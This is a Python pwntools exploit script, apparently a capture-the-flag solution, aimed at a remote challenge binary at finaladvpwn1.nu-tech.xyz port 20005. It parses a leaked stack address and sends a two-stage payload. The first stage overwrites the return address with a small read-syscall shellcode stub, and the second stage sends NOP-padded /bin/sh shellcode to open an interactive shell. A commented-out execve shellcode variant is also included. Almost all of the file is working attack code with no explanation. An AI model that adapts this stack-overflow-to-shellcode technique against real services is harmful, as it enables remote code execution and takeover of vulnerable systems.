#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host finaladvpwn1.nu-tech.xyz --port 20005 ./pwn
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./pwn')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'finaladvpwn1.nu-tech.xyz'
port = int(args.PORT or 20005)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)
# RWX:      Has RWX segments

io = start()

io.recvuntil('ini apa : [')
leak = int(io.recvuntil("] ?",drop=True),16)
# shellcode = asm("""
#     push 0x68
#     mov rax, 0x732f2f2f6e69622f
#     push rax
#     mov rdi, rsp
#     xor rsi, rsi /* 0 */
#     xor edx, edx /* 0 */
#     push SYS_execve /* 0x3b */
#     pop rax
#     syscall
#     """)
read_shellcode = shellcraft.read(0,leak,255)

read_shellcode = asm("""
    lea rsi, [rsp-0x20]
    xor rdi, rdi 
    mov dl, 0xff
    push 0 /* 0x3b */
    pop rax
    syscall
    """)
print(len(read_shellcode))
# she
# print(len(shellcode))

p = read_shellcode.ljust(8*3,"\x90")
p += p64(leak)
# p += shellcode
# print len(p)
io.sendline(p)

p = asm(shellcraft.sh()).rjust(255,"\x90")
io.send(p)

io.interactive()

